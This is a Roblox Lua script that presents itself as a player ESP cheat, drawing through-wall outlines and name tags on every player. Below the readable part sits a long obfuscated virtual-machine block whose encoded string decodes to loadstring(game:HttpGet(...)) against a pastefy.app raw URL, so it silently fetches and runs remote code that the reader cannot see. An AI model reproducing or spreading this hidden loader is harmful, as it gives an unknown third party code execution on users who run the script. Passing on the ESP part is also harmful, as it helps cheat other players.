local Players = game:GetService("Players")

local function applyESP(player, character)
	if not character then return end

	local head = character:WaitForChild("Head", 5)
	if not head then return end

	if character:FindFirstChild("PlayerHighlight") then
		character.PlayerHighlight:Destroy()
	end

	if head:FindFirstChild("NameBillboard") then
		head.NameBillboard:Destroy()
	end

	local highlight = Instance.new("Highlight")
	highlight.Name = "PlayerHighlight"
	highlight.Adornee = character
	highlight.FillTransparency = 1
	highlight.OutlineTransparency = 0
	highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
	highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	highlight.Parent = character

	local billboard = Instance.new("BillboardGui")
	billboard.Name = "NameBillboard"
	billboard.Size = UDim2.fromOffset(200, 40) 
	billboard.StudsOffsetWorldSpace = Vector3.new(0, 2.8, 0)
	billboard.AlwaysOnTop = true
	billboard.MaxDistance = math.huge
	billboard.Adornee = head
	billboard.Parent = head

	local text = Instance.new("TextLabel")
	text.Size = UDim2.fromScale(1, 1)
	text.BackgroundTransparency = 1
	text.Text = player.Name
	text.TextColor3 = Color3.fromRGB(255, 255, 0)
	text.TextStrokeTransparency = 0
	text.TextStrokeColor3 = Color3.new(0, 0, 0)
	text.Font = Enum.Font.SourceSansBold
	text.TextScaled = false
	text.TextSize = 15 -- 🔒 ล็อกไว้ 15
	text.AutomaticSize = Enum.AutomaticSize.None
	text.TextWrapped = false
	text.Parent = billboard

	local uiScale = Instance.new("UIScale")
	uiScale.Scale = 1
	uiScale.Parent = billboard
end

local function setupPlayer(player)
	player.CharacterAdded:Connect(function(character)
		applyESP(player, character)
	end)

	if player.Character then
		applyESP(player, player.Character)
	end
end

for _, player in ipairs(Players:GetPlayers()) do
	setupPlayer(player)
end

Players.PlayerAdded:Connect(setupPlayer)


local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v80=0;while true do if (v80==0) then v19=v0(v3(v30,1,1));return "";end end else local v81=0;local v82;while true do if (v81==0) then v82=v2(v0(v30,16));if v19 then local v106=0;local v107;while true do if (v106==1) then return v107;end if (v106==0) then v107=v5(v82,v19);v19=nil;v106=1;end end else return v82;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v83=(v31/(2^(v32-1)))%(((2 + 3) -3)^(((v33-(2 -1)) -(v32-1)) + (1 -0))) ;return v83-(v83%(2 -1)) ;else local v84=(621 -(555 + 64))^(v32-((147 + 785) -(857 + 74))) ;return (((v31%(v84 + v84))>=v84) and (569 -(367 + (1078 -(282 + 595))))) or (927 -(214 + 713)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (1639 -(1523 + 114)) );v18=v18 + 2 + 0 ;return (v36 * 256) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + 3 );v18=v18 + ((122 -(32 + 85)) -1) ;return (v40 * (16778281 -(68 + 978 + 19))) + (v39 * (66806 -(226 + 1044))) + (v38 * (1114 -858)) + v37 ;end local function v24() local v41=0 + (0 -0) ;local v42;local v43;local v44;local v45;local v46;local v47;while true do if (v41==((950 + 7) -(892 + (856 -(368 + 423))))) then v42=v23();v43=v23();v41=2 -1 ;end if (v41==3) then if (v46==0) then if (v45==(0 -0)) then return v47 * (0 -0) ;else v46=351 -((273 -186) + 263) ;v44=180 -(67 + (131 -(10 + 8))) ;end elseif (v46==(1502 + 545)) then return ((v45==(0 -0)) and (v47 * (((3 -2) + 0)/(0 -0)))) or (v47 * NaN) ;end return v8(v47,v46-1023 ) * (v44 + (v45/((954 -(802 + 150))^(139 -87)))) ;end if (v41==(3 -1)) then v46=v20(v43,21,31);v47=((v20(v43,32)==(1 + 0)) and  -(998 -(915 + 82))) or (2 -1) ;v41=3;end if (v41==(1 + 0)) then v44=1 -0 ;v45=(v20(v43,1188 -(1069 + 118) ,45 -25 ) * ((3 -1)^(6 + 26))) + v42 ;v41=2;end end end local function v25(v48) local v49=442 -(416 + 26) ;local v50;local v51;while true do if (v49==(6 -4)) then v51={};for v91=1 + 0 , #v50 do v51[v91]=v2(v1(v3(v50,v91,v91)));end v49=(2 + 2) -(2 -1) ;end if (v49==((777 -339) -(145 + 293))) then v50=nil;if  not v48 then v48=v23();if (v48==(0 -0)) then return "";end end v49=431 -(44 + 386) ;end if (v49==(1489 -(998 + 488))) then return v6(v51);end if (v49==(1 + 0 + 0)) then v50=v3(v16,v18,(v18 + v48) -(3 -2) );v18=v18 + v48 ;v49=861 -(814 + 45) ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();while true do if (v52==0) then local v88=(function() return 0;end)();while true do if (v88==(0 + 0)) then local v100=(function() return 0 + 0 ;end)();while true do if ((1 + 0)~=v100) then else v88=(function() return 1;end)();break;end if (v100~=(0 + 0)) then else v53=(function() return function(v154,v155,v156) local v157=(function() return 0 -0 ;end)();local v158=(function() return;end)();while true do if (v157==(0 -0)) then v158=(function() return 0 -0 ;end)();while true do if (0==v158) then v154[v155-#"!" ]=(function() return v156();end)();return v154,v155,v156;end end break;end end end;end)();v54=(function() return {};end)();v100=(function() return 1 + 0 ;end)();end end end if (1==v88) then v55=(function() return {};end)();v52=(function() return 1 + 0 ;end)();break;end end end if (v52~=1) then else local v89=(function() return 396 -(115 + 281) ;end)();while true do if (v89==1) then v58=(function() return v23();end)();v52=(function() return 4 -2 ;end)();break;end if ((0 + 0)==v89) then v56=(function() return {};end)();v57=(function() return {v54,v55,nil,v56};end)();v89=(function() return 3 -2 ;end)();end end end if (v52~=(869 -(550 + 317))) then else local v90=(function() return 0 -0 ;end)();while true do if (v90==1) then v57[ #"19("]=(function() return v21();end)();v52=(function() return 3 -0 ;end)();break;end if ((0 -0)~=v90) then else v59=(function() return {};end)();for v108= #"[",v58 do local v109=(function() return 285 -(134 + 151) ;end)();local v110=(function() return;end)();local v111=(function() return;end)();local v112=(function() return;end)();while true do if (v109==1) then v112=(function() return nil;end)();while true do if (v110==0) then v111=(function() return v21();end)();v112=(function() return nil;end)();v110=(function() return 1;end)();end if (v110==1) then if (v111== #",") then v112=(function() return v21()~=0 ;end)();elseif (v111==(1667 -(970 + 695))) then v112=(function() return v24();end)();elseif (v111~= #"91(") then else v112=(function() return v25();end)();end v59[v108]=(function() return v112;end)();break;end end break;end if (v109==0) then local v153=(function() return 0 -0 ;end)();while true do if (v153~=(1990 -(582 + 1408))) then else v110=(function() return 0;end)();v111=(function() return nil;end)();v153=(function() return 1;end)();end if (v153==(3 -2)) then v109=(function() return 1 -0 ;end)();break;end end end end end v90=(function() return 1;end)();end end end if ((11 -8)==v52) then for v93= #"<",v23() do local v94=(function() return v21();end)();if (v20(v94, #">", #"}")~=0) then else local v102=(function() return 1824 -(1195 + 629) ;end)();local v103=(function() return;end)();local v104=(function() return;end)();local v105=(function() return;end)();while true do if (v102==(3 -0)) then if (v20(v104, #"91(", #"-19")~= #"]") then else v105[ #"xnxx"]=(function() return v59[v105[ #"?id="]];end)();end v54[v93]=(function() return v105;end)();break;end if (v102==1) then local v147=(function() return 0;end)();local v148=(function() return;end)();while true do if (v147==0) then v148=(function() return 0;end)();while true do if (v148~=(241 -(187 + 54))) then else local v173=(function() return 0;end)();while true do if (v173==(781 -(162 + 618))) then v148=(function() return 1 + 0 ;end)();break;end if (v173==(0 + 0)) then v105=(function() return {v22(),v22(),nil,nil};end)();if (v103==0) then local v177=(function() return 0 -0 ;end)();local v178=(function() return;end)();while true do if (v177~=0) then else v178=(function() return 0 -0 ;end)();while true do if (v178~=0) then else v105[ #"19("]=(function() return v22();end)();v105[ #"0836"]=(function() return v22();end)();break;end end break;end end elseif (v103== #",") then v105[ #"xnx"]=(function() return v23();end)();elseif (v103==(1 + 1)) then v105[ #"nil"]=(function() return v23() -((1638 -(1373 + 263))^(1016 -(451 + 549))) ;end)();elseif (v103~= #"19(") then else local v183=(function() return 0 + 0 ;end)();local v184=(function() return;end)();while true do if (v183==(0 -0)) then v184=(function() return 0 -0 ;end)();while true do if (v184==0) then v105[ #"xxx"]=(function() return v23() -((1386 -(746 + 638))^(7 + 9)) ;end)();v105[ #".com"]=(function() return v22();end)();break;end end break;end end end v173=(function() return 1 -0 ;end)();end end end if (v148==1) then v102=(function() return 2;end)();break;end end break;end end end if (v102~=(343 -(218 + 123))) then else if (v20(v104, #"|", #"|")~= #":") then else v105[1583 -(1535 + 46) ]=(function() return v59[v105[2]];end)();end if (v20(v104,2 + 0 ,1 + 1 )== #" ") then v105[ #"-19"]=(function() return v59[v105[ #"xxx"]];end)();end v102=(function() return 3;end)();end if (v102==0) then local v149=(function() return 560 -(306 + 254) ;end)();while true do if (v149==(1 + 0)) then v102=(function() return 1 -0 ;end)();break;end if ((1467 -(899 + 568))==v149) then v103=(function() return v20(v94,2 + 0 , #"19(");end)();v104=(function() return v20(v94, #"0836",6);end)();v149=(function() return 2 -1 ;end)();end end end end end end for v95= #"]",v23() do v55,v95,v28=(function() return v53(v55,v95,v28);end)();end return v57;end end end local function v29(v60,v61,v62) local v63=v60[604 -(268 + 335) ];local v64=v60[292 -(60 + (643 -(15 + 398))) ];local v65=v60[575 -(426 + 146) ];return function(...) local v66=v63;local v67=v64;local v68=v65;local v69=v27;local v70=1 + 0 ;local v71= -(1457 -(282 + (2156 -(18 + 964))));local v72={};local v73={...};local v74=v12("#",...) -(2 -1) ;local v75={};local v76={};for v85=0 + 0 ,v74 do if (v85>=v68) then v72[v85-v68 ]=v73[v85 + (1025 -(706 + 318)) ];else v76[v85]=v73[v85 + (1252 -(721 + 307 + 223)) ];end end local v77=(v74-v68) + (1272 -(945 + 326)) ;local v78;local v79;while true do v78=v66[v70];v79=v78[2 -1 ];if ((1432<3555) and (v79<=(3 + 0))) then if ((v79<=1) or (1065>3578)) then if (v79==(700 -(271 + 429))) then v76[v78[2 + 0 + 0 ]]();else local v113=0;local v114;local v115;while true do if (v113==(1501 -(1408 + 92))) then v76[v114 + 1 ]=v115;v76[v114]=v115[v78[1090 -(461 + 625) ]];break;end if (((1288 -((1843 -(20 + 830)) + 295))==v113) or (4795<1407)) then v114=v78[1 + 1 ];v115=v76[v78[1174 -(418 + 753) ]];v113=1 + 0 ;end end end elseif (v79==(1 + 1)) then v76[v78[1 + 1 ]]=v62[v78[1 + 2 ]];else local v118=0;local v119;while true do if (v118==(529 -(406 + 123))) then v119=v78[1771 -(1749 + 20) ];v76[v119]=v76[v119](v13(v76,v119 + 1 + 0 ,v71));break;end end end elseif (v79<=(1327 -(1249 + 73))) then if ((1853<4813) and (v79>(2 + 2))) then local v120=1145 -(364 + 102 + 679) ;local v121;local v122;local v123;local v124;while true do if (v120==(4 -2)) then for v170=v121,v71 do local v171=0 -(126 -(116 + 10)) ;while true do if (v171==0) then v124=v124 + 1 ;v76[v170]=v122[v124];break;end end end break;end if ((v120==1) or (2821<2431)) then v71=(v123 + v121) -1 ;v124=1900 -(106 + 133 + 1661) ;v120=1 + 1 ;end if (v120==0) then v121=v78[1 + 1 ];v122,v123=v69(v76[v121](v13(v76,v121 + (2 -1) ,v78[3])));v120=2 -1 ;end end else local v125;local v126,v127;local v128;local v129;v76[v78[116 -(4 + 110) ]]=v62[v78[587 -(57 + (1265 -(542 + 196))) ]];v70=v70 + (1428 -(41 + 1386)) ;v78=v66[v70];v76[v78[105 -(17 + 86) ]]=v62[v78[3 + 0 ]];v70=v70 + 1 ;v78=v66[v70];v129=v78[3 -1 ];v128=v76[v78[3]];v76[v129 + (2 -1) ]=v128;v76[v129]=v128[v78[4]];v70=v70 + (167 -((260 -138) + 44)) ;v78=v66[v70];v76[v78[2]]=v78[1 + 2 ];v70=v70 + 1 + 0 ;v78=v66[v70];v129=v78[2 -0 ];v126,v127=v69(v76[v129](v13(v76,v129 + ((2 + 1) -2) ,v78[(7 -4) + 0 ])));v71=(v127 + v129) -1 ;v125=0 + 0 ;for v150=v129,v71 do v125=v125 + (1 -0) ;v76[v150]=v126[v125];end v70=v70 + (66 -(30 + 35)) ;v78=v66[v70];v129=v78[2 + 0 ];v76[v129]=v76[v129](v13(v76,v129 + (1258 -(1043 + 214)) ,v71));v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[4 -2 ]]();v70=v70 + (1213 -(323 + 889)) ;v78=v66[v70];do return;end end elseif (v79>(15 -9)) then v76[v78[582 -(361 + (1770 -(1126 + 425))) ]]=v78[323 -(53 + 267) ];else do return;end end v70=v70 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403203Q00682Q7470733A2Q2F706173746566792E612Q702F3461786A646235582F72617700083Q0012043Q00013Q00122Q000100023Q00202Q00010001000300122Q000300046Q000100039Q0000026Q000100016Q00017Q00",v9(),...);
